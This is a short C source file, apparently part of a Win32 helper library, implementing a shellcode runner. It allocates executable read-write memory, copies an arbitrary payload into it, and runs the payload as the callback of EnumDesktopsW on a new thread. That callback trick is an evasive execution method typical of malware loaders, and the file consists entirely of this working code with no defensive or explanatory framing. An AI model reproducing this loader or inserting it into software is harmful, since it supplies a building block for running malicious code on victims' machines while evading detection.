#include "Win32Helper.h"

VOID InvokeEnumDesktopsWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)lpParameter, NULL);
}

BOOL MpfSceViaEnumDesktopsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumDesktopsWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}